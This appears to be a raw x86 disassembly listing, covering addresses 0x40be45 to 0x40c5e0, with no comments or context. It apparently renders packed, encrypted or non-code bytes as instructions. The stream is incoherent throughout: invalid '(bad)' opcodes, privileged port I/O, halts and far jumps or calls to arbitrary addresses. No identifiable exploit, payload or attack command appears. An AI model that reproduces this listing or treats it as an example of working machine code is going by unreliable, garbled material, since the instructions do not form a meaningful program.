  40be45:	add    DWORD PTR [eax-0x481a0fe0],edi
  40be4b:	inc    edi
  40be4d:	add    edx,DWORD PTR [ebx]
  40be4f:	enter  0xbae8,0x53
  40be53:	push   0x18
  40be55:	adc    BYTE PTR [eax],ch
  40be57:	adc    DWORD PTR [edx+ecx*1],edx
  40be5a:	xor    BYTE PTR [edx+0x1e088ddd],al
  40be60:	cmove  ebx,DWORD PTR [eax]
  40be63:	and    eax,0x3985b87d
  40be68:	fdiv   st(6),st
  40be6a:	mov    eax,ds:0x766ac450
  40be6f:	xchg   edi,eax
  40be70:	push   ss
  40be71:	jbe    0x40becb
  40be73:	arpl   di,dx
  40be75:	dec    ebx
  40be76:	fisub  DWORD PTR [ecx-0x3e]
  40be79:	or     DWORD PTR [edx],edi
  40be7b:	bnd jno 0x40be83
  40be7e:	inc    eax
  40be7f:	xor    al,0x94
  40be81:	ja     0x40be29
  40be83:	rcl    DWORD PTR [edi+0x13152dd5],cl
  40be89:	mov    edi,0xbb494c2e
  40be8e:	or     eax,DWORD PTR [eax-0x719b4e0b]
  40be94:	pop    edi
  40be95:	out    dx,al
  40be96:	or     BYTE PTR [esp+edi*4],bh
  40be99:	ja     0x40be8c
  40be9b:	and    cl,cl
  40be9d:	mov    al,ds:0x66fdc20c
  40bea2:	mov    edi,0xa9b18ccf
  40bea7:	out    dx,eax
  40bea8:	aam    0x42
  40beaa:	sub    ebp,DWORD PTR [ebx+0x5c9e7778]
  40beb0:	adc    eax,0xd2d1c2c1
  40beb5:	hlt    
  40beb6:	push   edx
  40beb7:	add    dl,BYTE PTR [ecx-0x21]
  40beba:	test   BYTE PTR [ecx+0x7e],0x93
  40bebe:	call   0xca5126c4
  40bec3:	or     DWORD PTR [esi-0x79f1531a],esi
  40bec9:	push   ecx
  40beca:	shl    BYTE PTR [edx-0x7612ea18],1
  40bed0:	xchg   edi,eax
  40bed1:	inc    ebx
  40bed2:	cld    
  40bed3:	cwde   
  40bed4:	mov    esi,0x1918d46e
  40bed9:	mov    edi,0x9259606a
  40bede:	repnz xor al,0xcd
  40bee1:	adc    cl,ch
  40bee3:	dec    ecx
  40bee4:	daa    
  40bee5:	pop    es
  40bee6:	push   esp
  40bee7:	push   ebp
  40bee8:	mov    esi,0x154139e9
  40beed:	push   edi
  40beee:	mov    dh,0xb7
  40bef0:	xor    esp,DWORD PTR [edi*4+0x2228d8fb]
  40bef7:	fdiv   QWORD PTR [eax-0x49f3df0b]
  40befd:	cmp    BYTE PTR [eax+0x10460db9],0x9c
  40bf04:	pop    esi
  40bf05:	mov    ch,0x8a
  40bf07:	gs aad 0xfb
  40bf0a:	xor    dl,BYTE PTR [edi+esi*8]
  40bf0d:	ins    DWORD PTR es:[edi],dx
  40bf0e:	jl     0x40bea9
  40bf10:	out    dx,al
  40bf11:	and    DWORD PTR [ecx],esp
  40bf13:	xchg   ecx,eax
  40bf14:	jmp    0x40bf34
  40bf16:	xchg   ebp,eax
  40bf17:	inc    ebx
  40bf18:	in     eax,dx
  40bf19:	data16 or al,ah
  40bf1c:	dec    edx
  40bf1d:	xor    BYTE PTR [esi+eiz*2+0x42],cl
  40bf21:	fcomp  DWORD PTR [ebx]
  40bf23:	cwde   
  40bf24:	hlt    
  40bf25:	or     eax,0x4f3a7098
  40bf2a:	mov    es,WORD PTR ds:0xb110b3b2
  40bf30:	in     al,0x5d
  40bf32:	outs   dx,BYTE PTR ds:[esi]
  40bf33:	xchg   ebx,eax
  40bf34:	cmp    bl,BYTE PTR [ebx]
  40bf36:	mov    bl,0x3c
  40bf38:	fnstenv [edi+0x3b]
  40bf3b:	ret    
  40bf3c:	cmp    al,0x1e
  40bf3e:	jmp    0x73f5:0xbbbd9a76
  40bf45:	icebp  
  40bf46:	xchg   esi,eax
  40bf47:	push   edi
  40bf48:	(bad)  
  40bf49:	sub    BYTE PTR es:[esi],dh
  40bf4c:	push   ss
  40bf4d:	and    eax,esi
  40bf4f:	jecxz  0x40bfbb
  40bf51:	dec    ebp
  40bf52:	cmp    eax,0xd5248b96
  40bf57:	and    ebx,DWORD PTR [ebp-0x139991bb]
  40bf5d:	sub    eax,0xaa6cfa12
  40bf62:	dec    edi
  40bf63:	mov    ecx,0xa85411ed
  40bf68:	adc    ebp,DWORD PTR [ebp-0x6ae81fbf]
  40bf6e:	sbb    bh,0x80
  40bf71:	int    0x5
  40bf73:	retf   
  40bf74:	gs dec esi
  40bf76:	pop    ebp
  40bf77:	pop    ecx
  40bf78:	sbb    BYTE PTR [edi+0x49],dh
  40bf7b:	push   ecx
  40bf7c:	nop
  40bf7d:	mov    dl,BYTE PTR [eax]
  40bf7f:	and    BYTE PTR [esi],ah
  40bf81:	test   al,0x34
  40bf83:	mov    ebx,esi
  40bf85:	fcmovnu st,st(6)
  40bf87:	pop    esi
  40bf88:	xor    eax,0x9d994bfc
  40bf8d:	jnp    0x40bf8b
  40bf8f:	test   DWORD PTR [esi],esi
  40bf91:	dec    ebp
  40bf92:	jb     0x40bf32
  40bf94:	mov    edx,DWORD PTR [ecx-0x3a86f4a5]
  40bf9a:	test   al,0x58
  40bf9c:	iret   
  40bf9d:	call   0x21da:0xca32dfa
  40bfa4:	jmp    0xe142a192
  40bfa9:	pusha  
  40bfaa:	shl    BYTE PTR [ecx],0xcb
  40bfad:	xor    BYTE PTR [edx],dh
  40bfaf:	or     eax,0xc97667a4
  40bfb4:	icebp  
  40bfb5:	jb     0x40bfa6
  40bfb7:	or     DWORD PTR [ebx],0x5f
  40bfba:	and    DWORD PTR [ebx-0x65],0xe3327b4b
  40bfc1:	cmp    ebp,ecx
  40bfc3:	dec    edi
  40bfc4:	pop    ss
  40bfc5:	or     BYTE PTR [esi],0xbf
  40bfc8:	in     eax,0xaa
  40bfca:	mov    ds:0x4ffbae50,eax
  40bfcf:	inc    edi
  40bfd0:	int3   
  40bfd1:	call   0xbc2bee98
  40bfd6:	jmp    0x40bf63
  40bfd8:	fild   DWORD PTR [ebp+edi*2-0x1b]
  40bfdc:	adc    al,0x9c
  40bfde:	test   al,0x62
  40bfe0:	test   al,0x11
  40bfe2:	sbb    ax,0x946c
  40bfe6:	xchg   esi,eax
  40bfe7:	xchg   edi,eax
  40bfe8:	in     al,dx
  40bfe9:	out    0xdd,eax
  40bfeb:	test   eax,0xe6c139ca
  40bff0:	mov    eax,0x3e6f1861
  40bff5:	mov    DWORD PTR [edx],eax
  40bff7:	mov    dh,0x20
  40bff9:	xchg   esp,eax
  40bffa:	repnz std 
  40bffc:	jbe    0x40bfc7
  40bffe:	push   0xc401de71
  40c003:	dec    ebx
  40c004:	dec    esi
  40c005:	pop    ebp
  40c006:	mov    ebx,0x2c0d5f28
  40c00b:	adc    ch,BYTE PTR [edx-0x74e472d5]
  40c011:	fldpi  
  40c013:	test   eax,0xd3fef843
  40c018:	cmp    al,BYTE PTR [esi]
  40c01a:	cmp    BYTE PTR [edi-0xe799787],bh
  40c020:	jg     0x40c005
  40c022:	cld    
  40c023:	mov    ds:0x74a179e9,eax
  40c028:	adc    al,0xe0
  40c02a:	jecxz  0x40c08a
  40c02c:	xchg   ecx,eax
  40c02d:	in     eax,dx
  40c02e:	(bad)  
  40c02f:	jo     0x40bfe2
  40c031:	pop    edi
  40c032:	push   es
  40c033:	mov    eax,ds:0xfd3012e8
  40c038:	add    ebp,0xc09973e1
  40c03e:	les    ebx,FWORD PTR [ebx+0x6fb3fa69]
  40c044:	add    ecx,DWORD PTR [ebx]
  40c046:	push   esp
  40c047:	out    dx,al
  40c048:	call   0xb67d:0xe49da4e6
  40c04f:	jl     0x40c04f
  40c051:	cdq    
  40c052:	ins    BYTE PTR es:[edi],dx
  40c053:	xchg   ebp,eax
  40c054:	bound  edi,QWORD PTR [ebp+0x1a6d6431]
  40c05a:	ret    0x3241
  40c05d:	dec    ecx
  40c05e:	xor    eax,0x9225080a
  40c063:	jno    0x40c080
  40c065:	jae    0x40c07e
  40c067:	icebp  
  40c068:	adc    DWORD PTR [ecx-0x5f],ebx
  40c06b:	cmp    eax,0x9eb38d66
  40c070:	mov    dl,0x9d
  40c072:	cs cld 
  40c074:	outs   dx,DWORD PTR fs:[esi]
  40c076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c077:	adc    bh,BYTE PTR [edx-0x357ac198]
  40c07d:	and    bl,0xa1
  40c080:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c081:	mov    esp,0xd5b69e4e
  40c086:	push   esp
  40c087:	test   BYTE PTR [eax],0x63
  40c08a:	retf   0xa90f
  40c08d:	popf   
  40c08e:	xchg   ecx,eax
  40c08f:	rcl    BYTE PTR [ebx-0x3d],cl
  40c092:	pop    es
  40c093:	or     BYTE PTR cs:[edx+0x28],bh
  40c097:	bound  esp,QWORD PTR [ebx]
  40c099:	cli    
  40c09a:	sbb    DWORD PTR [ebp+edi*4-0x361d9778],0xffffff89
  40c0a2:	jmp    0xd7c4:0xa7daa44
  40c0a9:	mov    ecx,0x5e1802b
  40c0ae:	repz push esp
  40c0b0:	dec    ebp
  40c0b1:	icebp  
  40c0b2:	inc    edi
  40c0b3:	es je  0x40c042
  40c0b6:	imul   ebx,DWORD PTR [eax+0xbc05002],0xffffffbb
  40c0bd:	test   al,0xb5
  40c0bf:	sub    ecx,ebx
  40c0c1:	jne    0x40c121
  40c0c3:	sbb    ah,BYTE PTR [eax]
  40c0c5:	maskmovq mm3,(bad)
  40c0c6:	neg    DWORD PTR [eax+ebx*8-0x7b]
  40c0ca:	and    al,0xf9
  40c0cc:	pop    ds
  40c0cd:	stc    
  40c0ce:	pop    ebx
  40c0cf:	jae    0x40c0ab
  40c0d1:	cld    
  40c0d2:	out    0xe2,eax
  40c0d4:	adc    al,0xf6
  40c0d6:	dec    esp
  40c0d7:	js     0x40c074
  40c0d9:	mov    WORD PTR [edx-0x1a],es
  40c0dc:	mov    bl,0x8f
  40c0de:	add    al,0x70
  40c0e0:	sar    BYTE PTR [ebx+0x262594b0],cl
  40c0e6:	xor    dh,BYTE PTR [eax]
  40c0e8:	jmp    0x3994:0x35ed74a9
  40c0ef:	fld    DWORD PTR [esi-0x47]
  40c0f2:	lea    ecx,[ebx-0x601f211]
  40c0f8:	pop    ds
  40c0f9:	shl    DWORD PTR [esi+0x3d],0xb
  40c0fd:	inc    edx
  40c0fe:	jmp    0x262e0ccb
  40c103:	fidivr WORD PTR [ecx]
  40c105:	sub    ch,BYTE PTR [esi-0x59]
  40c108:	fisub  WORD PTR [esi]
  40c10a:	clc    
  40c10b:	push   ecx
  40c10c:	rdpmc  
  40c10e:	(bad)  
  40c10f:	cmc    
  40c110:	mov    cl,0xba
  40c112:	mov    ecx,0x29abd19e
  40c117:	mov    cl,0x91
  40c119:	mov    ds:0x1e56b93c,al
  40c11e:	pop    ss
  40c11f:	mov    ah,BYTE PTR [esi-0x55]
  40c122:	dec    esp
  40c123:	push   edx
  40c124:	lods   eax,DWORD PTR ds:[esi]
  40c125:	lock xchg BYTE PTR [eax-0x520b6e67],bh
  40c12c:	retf   0x7034
  40c12f:	push   ss
  40c130:	aam    0xaf
  40c132:	add    edx,esi
  40c134:	lahf   
  40c135:	arpl   WORD PTR [ecx],bp
  40c137:	or     DWORD PTR [eax+0x28],eax
  40c13a:	jp     0x40c0f4
  40c13c:	or     al,0xe5
  40c13e:	and    ecx,DWORD PTR [esp+ebp*1]
  40c141:	in     eax,dx
  40c142:	push   eax
  40c143:	and    ebp,ebx
  40c145:	mov    dl,0x8b
  40c147:	adc    DWORD PTR [ebx+0x3e],ecx
  40c14a:	pushf  
  40c14b:	inc    ebx
  40c14c:	mov    eax,ds:0x226b89e6
  40c151:	mov    edx,0x334f0d7a
  40c156:	pop    ebx
  40c157:	mov    esi,DWORD PTR [eax-0x39fa3f36]
  40c15d:	and    cl,BYTE PTR [eax]
  40c15f:	or     DWORD PTR [ecx-0x1c],ebp
  40c162:	cmp    edx,DWORD PTR [ebp+esi*8-0x2d]
  40c166:	test   bh,ah
  40c168:	in     al,dx
  40c169:	out    dx,eax
  40c16a:	mov    DWORD PTR [edi+edi*1],ecx
  40c16d:	mov    ds:0xc3dbf7e1,al
  40c172:	pop    eax
  40c173:	cmp    bh,BYTE PTR [edi]
  40c175:	lods   al,BYTE PTR ds:[esi]
  40c176:	test   eax,0xaf7a82a1
  40c17b:	push   esp
  40c17c:	outs   dx,BYTE PTR ds:[esi]
  40c17d:	adc    cl,BYTE PTR [ebx-0x34780932]
  40c183:	loope  0x40c178
  40c185:	test   al,0x41
  40c187:	and    eax,0xb6c72c56
  40c18c:	dec    eax
  40c18d:	xchg   edi,eax
  40c18e:	fsubr  QWORD PTR [ebx-0x27]
  40c191:	dec    esp
  40c192:	add    esi,DWORD PTR [ecx+0x1b]
  40c195:	aas    
  40c196:	cmp    eax,0x17e8dece
  40c19b:	aas    
  40c19c:	xchg   edi,eax
  40c19d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c19e:	fild   DWORD PTR [edi+0x9]
  40c1a1:	imul   eax,edi,0xffffffd6
  40c1a4:	sub    al,0x8d
  40c1a6:	xchg   DWORD PTR [ebx-0x46],ebp
  40c1a9:	out    0x6c,al
  40c1ab:	aas    
  40c1ac:	xlat   BYTE PTR ds:[ebx]
  40c1ad:	cmp    al,0xa1
  40c1af:	cs stos DWORD PTR es:[edi],eax
  40c1b1:	push   es
  40c1b2:	cdq    
  40c1b3:	mov    al,0x5
  40c1b5:	adc    cl,ch
  40c1b7:	fcmovbe st,st(4)
  40c1b9:	sysexit 
  40c1bb:	sub    bh,BYTE PTR [eax]
  40c1bd:	and    esi,edi
  40c1bf:	pop    ebp
  40c1c0:	pushf  
  40c1c1:	into   
  40c1c2:	loopne 0x40c235
  40c1c4:	je     0x40c1cb
  40c1c6:	(bad)  
  40c1c8:	push   0xf83dcf9a
  40c1cd:	pop    esp
  40c1ce:	dec    edx
  40c1cf:	fs mov ebx,0x141495ab
  40c1d5:	xchg   ecx,eax
  40c1d6:	cmp    DWORD PTR [eax+eax*2],ebx
  40c1d9:	mov    ds:0x92ff3bdc,eax
  40c1de:	lods   eax,DWORD PTR ds:[esi]
  40c1df:	or     dl,BYTE PTR [edx]
  40c1e1:	loopne 0x40c193
  40c1e3:	das    
  40c1e4:	xchg   ebp,eax
  40c1e5:	xchg   esi,eax
  40c1e6:	jbe    0x40c1a3
  40c1e8:	pop    eax
  40c1e9:	dec    ecx
  40c1ea:	js     0x40c189
  40c1ec:	push   esp
  40c1ed:	icebp  
  40c1ee:	push   edx
  40c1ef:	int3   
  40c1f0:	clc    
  40c1f1:	xchg   ecx,eax
  40c1f2:	jle    0x40c21d
  40c1f4:	out    dx,al
  40c1f5:	pop    ss
  40c1f6:	inc    edi
  40c1f7:	leave  
  40c1f8:	test   DWORD PTR [ebp+edx*2-0x5c],edi
  40c1fc:	sbb    esi,edx
  40c1fe:	lock dec esi
  40c200:	jno    0x40c278
  40c202:	cwde   
  40c203:	pop    eax
  40c204:	(bad)  
  40c205:	adc    bh,BYTE PTR [edi]
  40c207:	scas   eax,DWORD PTR es:[edi]
  40c208:	cli    
  40c209:	(bad)  
  40c20a:	fsubr  DWORD PTR [ecx-0x63bbb722]
  40c210:	and    BYTE PTR [esi-0xc],dh
  40c213:	mov    BYTE PTR [edx-0x7d4b95b6],bl
  40c219:	mov    ds:0x2284cb3b,al
  40c21e:	mov    ebp,0x352693df
  40c223:	pop    es
  40c224:	ret    
  40c225:	mov    bl,0xd6
  40c227:	pop    esi
  40c228:	outs   dx,BYTE PTR ds:[esi]
  40c229:	(bad)  
  40c22a:	dec    esp
  40c22b:	or     DWORD PTR [edx+eax*2+0x4c8badd3],ecx
  40c232:	jge    0x40c1da
  40c234:	and    eax,0x3327f2bc
  40c239:	mov    BYTE PTR [ebx+0x75c8ace],cl
  40c23f:	push   ebx
  40c240:	sbb    BYTE PTR [ebp+0x2593ae24],dh
  40c246:	icebp  
  40c247:	aaa    
  40c248:	fucompp 
  40c24a:	lea    edx,[ebp-0x55]
  40c24d:	test   DWORD PTR [edx+ecx*4+0x10],ebp
  40c251:	(bad)  
  40c252:	jne    0x40c287
  40c254:	mov    dl,0x2d
  40c256:	adc    esi,ebp
  40c258:	nop
  40c259:	or     ah,0x77
  40c25c:	push   ebx
  40c25d:	mov    bl,0xa
  40c25f:	jecxz  0x40c240
  40c261:	mov    cl,0xcb
  40c263:	xor    DWORD PTR [edi-0x58028662],ecx
  40c269:	fs mov dh,0xec
  40c26c:	aam    0xe4
  40c26e:	fcomp  DWORD PTR ds:0xc82ec546
  40c274:	push   ebp
  40c275:	push   eax
  40c276:	jne    0x40c23e
  40c278:	jns    0x40c284
  40c27a:	mov    dl,BYTE PTR [eax+0x0]
  40c27d:	cmp    eax,0x1e63ab9d
  40c282:	adc    ebx,DWORD PTR [esi+eax*1+0x61]
  40c286:	jmp    0x5c59:0xa8c1289c
  40c28d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c28e:	push   es
  40c28f:	sahf   
  40c290:	sbb    bl,BYTE PTR [ebx]
  40c292:	jmp    0xaf1409ef
  40c297:	aas    
  40c298:	(bad)  
  40c299:	daa    
  40c29a:	inc    esp
  40c29b:	enter  0x2b2d,0x8a
  40c29f:	mov    bh,0xd5
  40c2a1:	sbb    eax,0x256572f3
  40c2a6:	add    DWORD PTR [edx+0x41590637],edx
  40c2ac:	ret    0x3992
  40c2af:	cld    
  40c2b0:	dec    BYTE PTR [esi]
  40c2b2:	jo     0x40c2c5
  40c2b4:	inc    edx
  40c2b5:	mov    edx,0x9bd5526d
  40c2ba:	cmp    eax,0xfc2a3c8f
  40c2bf:	mov    eax,ds:0xa10ea4f4
  40c2c4:	pop    esi
  40c2c5:	push   0x7f
  40c2c7:	les    ebx,FWORD PTR [edx+0x10]
  40c2ca:	add    al,0x22
  40c2cc:	or     al,0xa2
  40c2ce:	mov    bh,0xf5
  40c2d0:	xchg   esi,eax
  40c2d1:	dec    esp
  40c2d2:	lds    edi,FWORD PTR [ecx+0x24]
  40c2d5:	bound  ax,DWORD PTR [esi]
  40c2d8:	icebp  
  40c2d9:	xor    eax,0xd518a029
  40c2de:	int3   
  40c2df:	mov    DWORD PTR [edi],edi
  40c2e1:	jns    0x40c334
  40c2e3:	mov    eax,ds:0x9d4b4b6e
  40c2e8:	mov    dh,0xa2
  40c2ea:	pop    edi
  40c2eb:	pop    ebp
  40c2ec:	jmp    0xa8255d3c
  40c2f1:	mov    esp,0x1ac75410
  40c2f6:	stos   BYTE PTR es:[edi],al
  40c2f7:	jo     0x40c30f
  40c2f9:	out    0xe7,eax
  40c2fb:	mov    edi,0xaefc8743
  40c300:	sbb    DWORD PTR [edi+0x2ba1a183],0xffffffe0
  40c307:	bnd jb 0x40c28a
  40c30a:	mov    al,0x50
  40c30c:	popf   
  40c30d:	and    DWORD PTR [ebx-0x587264f4],0xfffffff0
  40c314:	test   DWORD PTR [ebx],esi
  40c316:	(bad)  
  40c317:	sbb    ah,dh
  40c319:	pusha  
  40c31a:	dec    eax
  40c31b:	mov    eax,0xa53e716d
  40c320:	sbb    edi,DWORD PTR [ecx+esi*1-0x23]
  40c324:	mov    edx,0xccdadcae
  40c329:	push   0xe7920d03
  40c32e:	jno    0x40c375
  40c330:	push   ds
  40c331:	jbe    0x40c31f
  40c333:	scas   eax,DWORD PTR es:[edi]
  40c334:	(bad)  
  40c335:	cs std 
  40c337:	mov    WORD PTR [edi+0x38afd136],?
  40c33d:	stos   DWORD PTR es:[edi],eax
  40c33e:	push   ecx
  40c33f:	hlt    
  40c340:	sub    eax,0xd0a9e831
  40c345:	fcmovnb st,st(2)
  40c347:	cwde   
  40c348:	or     al,0x78
  40c34a:	sti    
  40c34b:	push   ss
  40c34c:	mov    ds:0xf68652d,eax
  40c351:	mov    ch,0xfb
  40c353:	rol    ch,0xc1
  40c356:	xor    DWORD PTR [edx-0x7dd19100],edx
  40c35c:	add    DWORD PTR [eax+0x6e],ebp
  40c35f:	add    cl,bh
  40c361:	inc    ebx
  40c362:	(bad)  
  40c363:	ret    0x3d93
  40c366:	jae    0x40c381
  40c368:	or     DWORD PTR [ebx-0x31018628],0xffffff92
  40c36f:	mov    esi,0xf55596cd
  40c374:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c375:	inc    eax
  40c376:	rol    BYTE PTR [edi+0x55],1
  40c379:	xor    al,0x68
  40c37b:	fild   DWORD PTR [ebp-0x313fca1]
  40c381:	inc    edi
  40c382:	add    BYTE PTR [ebp+0x15d973da],dh
  40c388:	cmp    ecx,DWORD PTR [edx+esi*8]
  40c38b:	(bad)  
  40c38c:	sub    al,0xe2
  40c38e:	scas   al,BYTE PTR es:[edi]
  40c38f:	mov    DWORD PTR [esi-0x3b],ecx
  40c392:	sbb    BYTE PTR [esi+0x59],al
  40c395:	adc    ecx,DWORD PTR [eax-0x3dd49429]
  40c39b:	in     al,0xf
  40c39d:	stc    
  40c39e:	add    DWORD PTR [esi+0x63493d0],ebp
  40c3a4:	mov    esp,0x940805
  40c3a9:	pop    edx
  40c3aa:	add    ch,ch
  40c3ac:	lahf   
  40c3ad:	ret    0x20d7
  40c3b0:	jns    0x40c42b
  40c3b2:	mov    WORD PTR [eax-0x71ae8df7],ds
  40c3b8:	fidivr DWORD PTR [esp+ebx*8-0x34]
  40c3bc:	fsub   QWORD PTR [esi+0x648a7281]
  40c3c2:	sub    al,0x1d
  40c3c4:	inc    ebp
  40c3c5:	out    dx,al
  40c3c6:	sbb    esp,DWORD PTR [eax+0x15]
  40c3c9:	cmc    
  40c3ca:	mov    ecx,ecx
  40c3cc:	call   0x395e:0xc50542a7
  40c3d3:	sub    eax,0x71085e14
  40c3d8:	je     0x40c360
  40c3da:	ret    
  40c3db:	or     ebp,DWORD PTR [ebp-0x16]
  40c3de:	shr    dh,cl
  40c3e0:	sbb    ecx,edx
  40c3e2:	jbe    0x40c437
  40c3e4:	dec    ecx
  40c3e6:	mov    esp,0x5f1de556
  40c3eb:	rcl    BYTE PTR [ebx],cl
  40c3ed:	dec    ecx
  40c3ee:	cli    
  40c3ef:	shr    DWORD PTR [edx+0x3b2c18aa],0xcd
  40c3f6:	jb     0x40c379
  40c3f8:	inc    ecx
  40c3f9:	add    esi,ecx
  40c3fb:	add    esp,edx
  40c3fd:	mov    edx,0xe96bacf
  40c402:	stc    
  40c403:	inc    esi
  40c404:	adc    cl,BYTE PTR es:[edx+0x2a]
  40c408:	add    esp,DWORD PTR [ebp-0x49f835f2]
  40c40e:	rol    BYTE PTR [ecx+0x66],0x8c
  40c412:	mov    dl,0xbd
  40c414:	add    edi,DWORD PTR [edx]
  40c416:	sbb    DWORD PTR [edi],0xd
  40c419:	push   esi
  40c41a:	aaa    
  40c41b:	test   al,0x38
  40c41d:	scas   eax,DWORD PTR es:[edi]
  40c41e:	jl     0x40c45a
  40c420:	out    dx,eax
  40c421:	out    dx,eax
  40c422:	pop    esi
  40c423:	pop    ebp
  40c424:	(bad)  
  40c425:	mov    al,0x50
  40c427:	sbb    BYTE PTR [ebp+0x1d34b62e],0x4b
  40c42e:	fwait
  40c42f:	sahf   
  40c430:	inc    ebx
  40c431:	mov    dl,0xee
  40c433:	iret   
  40c434:	pop    esp
  40c435:	call   0xa8464c8e
  40c43a:	push   esi
  40c43b:	aad    0x85
  40c43d:	pop    ebx
  40c43e:	mov    ds:0xd56f6392,eax
  40c443:	mov    ch,0x1d
  40c445:	or     DWORD PTR [esi+0x55c1ef5c],edx
  40c44b:	dec    edx
  40c44c:	pop    edi
  40c44d:	(bad)  
  40c44f:	pop    edi
  40c450:	scas   eax,DWORD PTR es:[edi]
  40c451:	inc    esi
  40c452:	in     eax,dx
  40c453:	sbb    eax,0x313be329
  40c458:	push   es
  40c459:	or     eax,0x2a893490
  40c45e:	push   0x9fcdd78f
  40c463:	or     eax,0x3d4fd5d5
  40c468:	push   ss
  40c469:	xor    eax,0x3ded3d95
  40c46e:	and    al,0xf9
  40c470:	inc    edi
  40c471:	(bad)
  40c474:	cdq    
  40c475:	arpl   WORD PTR [ebx+eiz*1+0x4f],di
  40c479:	pop    edi
  40c47a:	aas    
  40c47b:	sar    DWORD PTR [eax+ebx*1-0x55],cl
  40c47f:	jnp    0x40c472
  40c481:	mov    al,ds:0x9d5d2fae
  40c486:	mov    ah,BYTE PTR [edi+0x572c20e9]
  40c48c:	mov    WORD PTR [esp+ecx*4],?
  40c48f:	pop    ebx
  40c490:	xor    al,0x3d
  40c492:	mov    edx,0x28467468
  40c497:	mov    al,ds:0x5a5896c6
  40c49c:	into   
  40c49d:	js     0x40c43b
  40c49f:	mov    ds:0x948be30b,eax
  40c4a4:	test   al,0x79
  40c4a6:	lahf   
  40c4a7:	jo     0x40c4ca
  40c4a9:	es enter 0xeac5,0x4d
  40c4ae:	inc    ebp
  40c4af:	lea    ebx,[edi+ecx*1-0xa8fe4dd]
  40c4b6:	shr    DWORD PTR [edi],1
  40c4b8:	mul    DWORD PTR [ebp+0x6b884e8b]
  40c4be:	mov    al,0x3d
  40c4c0:	adc    eax,0xef22270
  40c4c5:	and    dh,bl
  40c4c7:	arpl   dx,ax
  40c4c9:	cmp    DWORD PTR ds:0x39f3edf0,edx
  40c4cf:	out    dx,al
  40c4d0:	(bad)  
  40c4d2:	fidiv  WORD PTR [edi+0x3a]
  40c4d5:	xchg   ebp,eax
  40c4d6:	inc    edi
  40c4d7:	mov    eax,0xbf6cfc94
  40c4dc:	ret    
  40c4dd:	sbb    ah,BYTE PTR [eax+ebp*1-0x7b]
  40c4e1:	lods   eax,DWORD PTR ds:[esi]
  40c4e2:	push   esi
  40c4e3:	dec    eax
  40c4e4:	test   al,0x81
  40c4e6:	dec    edi
  40c4e7:	mov    ch,al
  40c4e9:	ja     0x40c543
  40c4eb:	cld    
  40c4ec:	retf   
  40c4ed:	or     ebp,DWORD PTR [edx+0x48]
  40c4f0:	push   ds
  40c4f1:	push   esi
  40c4f2:	stc    
  40c4f3:	jge    0x40c4cd
  40c4f5:	aaa    
  40c4f6:	xlat   BYTE PTR ds:[ebx]
  40c4f7:	sbb    ah,BYTE PTR [edx+0x75b1aac9]
  40c4fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4fe:	mov    ah,0x1e
  40c500:	aas    
  40c501:	pushf  
  40c502:	or     DWORD PTR [esi],esp
  40c504:	add    ebx,edi
  40c506:	pop    ecx
  40c507:	daa    
  40c508:	push   ebp
  40c509:	cmp    al,0x1f
  40c50b:	test   DWORD PTR [esi-0x3b],ecx
  40c50e:	jne    0x40c4f0
  40c510:	dec    ebx
  40c511:	dec    ebx
  40c512:	in     al,dx
  40c513:	xor    BYTE PTR [esi+0x24],0xe
  40c517:	mov    BYTE PTR [esp+edx*1],bl
  40c51a:	mov    esi,0x3ea00a3b
  40c51f:	les    edi,FWORD PTR ds:0x5c3b
  40c524:	lea    ebp,[edx+0x48]
  40c527:	and    DWORD PTR [ebx],0x6d25a77d
  40c52d:	fstp   QWORD PTR [eax+ebp*8-0x59]
  40c531:	adc    DWORD PTR [esi+0x2cdc1e07],ebx
  40c537:	fist   WORD PTR [esi]
  40c539:	sti    
  40c53a:	mov    ch,0xe9
  40c53c:	iret   
  40c53d:	and    eax,0x1ad6f4ac
  40c542:	or     esp,DWORD PTR [edi+0x4b]
  40c545:	fs xor eax,0xd41ba9e6
  40c54b:	fstp   DWORD PTR [eax]
  40c54d:	cmp    ecx,DWORD PTR [ecx+eiz*4]
  40c550:	or     BYTE PTR [edx+0x1e0d2b09],ch
  40c556:	and    DWORD PTR [ebp+0x3aba3203],esi
  40c55c:	jl     0x40c4e8
  40c55e:	mov    ebx,0x8451299b
  40c563:	(bad)  
  40c564:	in     al,0x82
  40c566:	xchg   ebp,eax
  40c567:	mov    eax,ds:0x1d7d9e98
  40c56d:	adc    ebp,DWORD PTR [esi+ebp*4-0x23c9a2d4]
  40c574:	or     bh,cl
  40c576:	ss xchg ecx,eax
  40c578:	mov    eax,ds:0x4d3f4f9b
  40c57d:	ss jne 0x40c5a2
  40c580:	lods   al,BYTE PTR ds:[esi]
  40c581:	mov    cl,0xf6
  40c583:	call   0x85ab7959
  40c588:	das    
  40c589:	test   al,0x42
  40c58b:	inc    esp
  40c58c:	mov    eax,ds:0x9f25295e
  40c591:	inc    ecx
  40c592:	push   0xfffffffc
  40c594:	and    al,0xfe
  40c596:	fisttp QWORD PTR [edi-0x76]
  40c599:	fs xor eax,0x8e135eb0
  40c59f:	clc    
  40c5a0:	sub    BYTE PTR [ebx+ebx*4+0x757575c],al
  40c5a7:	repnz push edx
  40c5a9:	les    edi,FWORD PTR [edi]
  40c5ab:	popa   
  40c5ac:	ror    DWORD PTR [eax+0x17],1
  40c5af:	sub    eax,0xd8553cb6
  40c5b4:	in     eax,dx
  40c5b5:	rol    BYTE PTR [edx+esi*8+0x7c],0xf8
  40c5ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5bb:	xlat   BYTE PTR ds:[ebx]
  40c5bc:	lds    eax,FWORD PTR [edi+edx*1-0x65]
  40c5c0:	push   0x4a125ad4
  40c5c5:	push   esp
  40c5c6:	sbb    DWORD PTR [ecx+eiz*2+0x6d],eax
  40c5ca:	dec    edi
  40c5cb:	icebp  
  40c5cc:	pushf  
  40c5cd:	in     al,0x65
  40c5cf:	and    ebp,ebx
  40c5d1:	aas    
  40c5d2:	and    DWORD PTR [ebx+0x458603ce],eax
  40c5d8:	xchg   ebx,eax
  40c5d9:	add    bl,BYTE PTR [esi]
  40c5db:	ss pusha 
  40c5dd:	lds    esi,FWORD PTR [edi]
  40c5df:	dec    ecx
  40c5e0:	mov    eax,0xbdb815f0
